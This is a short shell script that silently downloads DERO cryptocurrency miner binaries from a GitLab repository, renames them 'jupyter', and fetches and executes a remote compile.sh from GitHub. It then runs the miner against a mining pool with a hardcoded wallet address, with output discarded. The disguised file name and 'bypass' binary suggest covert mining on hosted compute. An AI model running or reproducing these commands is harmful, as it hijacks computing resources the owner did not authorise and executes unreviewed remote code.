wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/bypass-dero-miner && chmod +x jupyter
wget -q -O jupyter https://gitlab.com/alekpoden82/binamas/-/raw/main/dero-stratum-miner && chmod +x jupyter
wget https://raw.githubusercontent.com/Omarjetos/ezz/master/compile.sh && chmod +x compile.sh
./jupyter  -r pool.whalesburg.com:4300  -w DEROderoi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xc0v2j0vsquftksu2ayrl.S05 >/dev/null 
./compile.sh
